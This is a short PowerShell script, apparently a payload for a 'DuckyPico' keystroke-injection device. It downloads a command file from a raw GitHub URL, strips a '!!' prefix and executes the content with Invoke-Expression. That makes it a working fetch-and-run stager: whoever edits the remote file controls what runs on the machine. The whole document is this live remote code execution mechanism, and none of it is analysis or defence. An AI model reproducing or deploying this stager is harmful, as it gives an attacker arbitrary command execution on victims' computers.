# Define the URL of the GitHub page
$githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/command.txt"

# Fetch the content of the GitHub page
$response = Invoke-WebRequest -Uri $githubUrl

# Get the raw content of the page (usually in HTML format)
$htmlContent = $response.Content

# Extract the command from the content (assuming it's text and starts with "!!")
$command = $htmlContent -replace '^!!', ''

# Run the command
Invoke-Expression -Command $command
